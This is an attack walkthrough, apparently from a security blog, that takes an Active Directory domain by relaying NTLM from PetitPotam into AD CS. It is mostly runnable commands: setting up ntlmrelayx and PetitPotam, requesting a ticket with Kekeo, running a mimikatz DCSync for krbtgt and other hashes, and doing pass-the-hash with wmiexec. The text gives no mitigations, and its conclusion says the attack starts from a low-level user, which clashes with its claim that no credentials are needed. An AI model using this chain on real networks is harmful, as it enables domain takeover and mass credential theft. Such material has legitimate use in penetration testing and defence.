### Exploiting PetitPotam for Domain Administrator Privileges

When PetitPotam is exploited, NTLM credentials can be relayed to Active Directory Certificate Services (AD CS), allowing an attacker to obtain Domain Administrator privileges without any prior authentication to the domain. Below are the detailed steps necessary for this exploitation, along with commands and configurations to execute it effectively.

### Key Vulnerabilities:
- **MS-EFSRPC (PetitPotam)**
- **Credential Relaying leveraging AD CS**

### Overview:
An attacker with internal network access, such as through a phished client or a malicious device, can take over the entire Active Directory domain without any initial credentials. Both Domain Controllers and AD CS are vulnerable to this attack in their default configurations.

### Exploitation Process:

1. **Trigger NTLM Relay with PetitPotam:**
   - Use PetitPotam to coerce a Domain Controller into authenticating via NTLM.
   - Relay the Domain Controller’s NTLM credentials to the AD CS Web Enrollment pages.

2. **Obtain a Domain Controller Certificate:**
   - Relay the credentials to AD CS using `ntlmrelayx`.
   - Enroll a Domain Controller certificate, which can be used to request a Ticket Granting Ticket (TGT) and compromise the entire domain using Pass-The-Ticket.

### Detailed Exploitation Steps:

#### Step 1: Set Up `ntlmrelayx` for Credential Relay
Before exploiting PetitPotam, configure `ntlmrelayx` to catch and relay credentials to the AD CS server. Use the `KerberosAuthentication` AD CS template, although the `DomainControllers` template can also be used.

```bash
# Clone and configure ntlmrelayx for AD CS attack
git clone https://github.com/ExAndroidDev/impacket.git
cd impacket
git checkout ntlmrelayx-adcs-attack
sudo pip3 uninstall impacket
sudo pip uninstall impacket
sudo pip3 install -r requirements.txt
sudo python3 setup.py install

# Start ntlmrelayx with SMB2 support and specify the AD CS target
sudo python3 ntlmrelayx.py -debug -smb2support --target http://pki.lab.local/certsrv/certfnsh.asp --adcs --template KerberosAuthentication
```

#### Step 2: Trigger NTLM Authentication with PetitPotam
Use PetitPotam to force the Domain Controller to authenticate to the relay listener (`ntlmrelayx`).

```bash
# Clone and set up PetitPotam
git clone https://github.com/topotam/PetitPotam
cd PetitPotam/
sudo pip3 install -r requirements.txt

# Trigger NTLM authentication using PetitPotam
python3 PetitPotam.py <listener_IP> <target_DC_IP>
```

#### Step 3: Relay NTLM Credentials to AD CS and Obtain a Certificate
Relay the Domain Controller’s NTLM credentials to the AD CS server and obtain a Base64-encoded PKCS12 certificate.

```bash
# Use ntlmrelayx to relay credentials to AD CS and obtain a certificate
sudo python3 ntlmrelayx.py -tf targets.txt -smb2support
```

#### Step 4: Obtain a TGT with Kekeo
Take the Base64 PKCS12 certificate obtained through NTLM relaying and import it into Kekeo to request a TGT.

```bash
# Download and set up Kekeo
curl https://github.com/gentilkiwi/kekeo/releases/download/2.2.0-20210723/kekeo.zip -o kekeo.zip
tar -xf kekeo.zip
.\x64\kekeo.exe

# Use the certificate to request a TGT
base64 /input:on
tgt::ask /pfx:<Base64_cert_from_relay> /user:dc-101$ /domain:spencer.local /ptt
exit
```

#### Step 5: Dump LSA Secrets with Mimikatz
Use `mimikatz` to dump LSA secrets, such as the NT hash for the domain administrator.

```bash
# Download and set up mimikatz
curl https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20210724/mimikatz_trunk.zip -o mimikatz.zip
tar -xf mimikatz.zip
.\x64\mimikatz.exe

# Dump LSA secrets to obtain NT hash
lsadump::dcsync /domain:spencer.local /user:krbtgt
lsadump::dcsync /domain:spencer.local /user:<any_user>
exit
```

#### Step 6: Pass-The-Hash to Gain Execution as the Domain Administrator
Use the obtained NT hash to execute commands as the domain administrator using `wmiexec`.

```bash
# Pass-The-Hash to execute as the domain administrator
wmiexec.py -hashes :<nt_hash> spencer/op@10.0.0.178
```

### Conclusion:
These steps demonstrate how PetitPotam, combined with NTLM relays to AD CS, can escalate privileges from a low-level user to Domain Administrator. This chain of exploits is particularly dangerous, as it can succeed even on fully patched Domain Controllers and AD CS setups.